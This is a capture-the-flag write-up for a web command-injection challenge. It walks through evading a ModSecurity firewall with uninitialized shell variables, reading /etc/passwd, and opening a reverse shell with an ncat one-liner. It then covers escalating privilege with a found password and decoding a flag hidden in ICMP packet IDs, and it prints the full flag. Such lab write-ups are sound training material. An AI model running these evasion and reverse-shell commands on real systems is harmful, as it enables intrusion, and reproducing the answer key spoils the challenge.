# Knock-Knock! Anyone There?
### Category: Networks
### Author: Delara (lara)

## Description

N-Team,

We've heard one of the prisoners of OmniFlags was working on a website before omni got to them. We suspect the website is quite buggy as it was still under development. Do you think you can break it?

HQ

## Hints
1. Have you looked at robots.txt?
2. Can you evade web application firewalls?

## Solution
1. Looking through the website you would notice that there is a box and a button called 'run'. The name of the box is also called 'command' which hints at you having the ability to run system commands on the server that's hosting this website.
2. Running 'ls' would give you all the files in the directory and of interest is the 'CHANGELOG' file. 
3. You could also look at robots.txt to get directed to this file. 
4. Looking through this file, we gain two valuable pieces of information,
   1. There is some proxy server running on the local network at '172.16.238.30'
   2. This website has Modsecurity firewall set up with CRS but one particular rule is excluded. 
5. Now it's time to explore and see what commands we can and we cannot run.
6. After exploring, you would be able to figure out you can run "dangerous" commands using uninitialized variables. 
7. With this you can run this command 'cat /etc$u/passwd$u' to print '/etc/passwd'
8. Furthermore, you can get reverse shell access using this command 'ncat$u <ip> <port> -e /bin$u/bash$u' (note that this is one of the many ways you could have gotten a reverse shell)
9. Once you get a reverse shell, you will the user 'www-data'. Exploring the box, you will find that there is a file called 'message.txt' in the user's 'sappheiros' home directory but you don't have permission to read this file. So you somehow need to escalate your privilege. 
10. In the '/opt/backup' directory there is a file called 'cGFzc3dvcmQ' which contains the user's password
11. Running 'su sappheiros' and giving it the password you found will make you the user
12. Now that you have access to the home directory you should be able to read the file and the content is 'part 1: magpie{y0u_h4v3_7h3_'. This is the first part of the flag.
13. We now need to explore the box more to figure out what the second part of the flag is. 
14. Given the content of '/etc/passwd' and 'etc/group' you will be able to figure out that the current user can run 'tcpdump' commands. 
15. Looking back at the CHANGELOG file you would guess that you need to listen for connections coming from that ip
16. Trying on a few 'tcpdump' methods, you will find that 'tcpdump -A host 172.16.238.30' will give you the information you need.
17. Examining the ICMP packets being sent, you will find that there is a message being formed that read like this 
'''
"Hello there! If you are reading this it means you have already broken into my server. Omniflags got to me before I could finish the implementation. Thus why you could probably break into it. I suddenly remembered this website I was working on and thought it would be a good way to send a message. Who knows maybe someone actually finds a way to break into my server. I'm sending this message as a secret just in case they find out what I have done. The flag is the only way to get me out of here so I really hope you find it. It's hidden in these messages but I can't tell you where in case they read these messages. You're close! Keep looking! Best of luck!
'''
18.  This hints that the rest of the flag in these packets. Examining the packets again more carefully, you will find that the id for the packets are all ascii numbers. 
19.  You now have to convert all the id's to ascii characters and this will give you the rest of the flag. (note that each packet gets sent and received and so you only need to count the id once)
20.  The beginning and the end of the id's are marked by the 'Hello There!' and the 'Best of luck!' messages respectively. 

### References
WAF evasion techniques: 

https://medium.com/secjuice/waf-evasion-techniques-718026d693d8 

https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0

https://www.secjuice.com/web-application-firewall-waf-evasion/

Hiding data in an ICMP packet:

https://www.researchgate.net/figure/An-ICMP-packet-carrying-a-hidden-message_fig3_268401309 

## Flag
`magpie{y0u_h4v3_7h3_p0w32_70_54v3_7h3_w021d}`
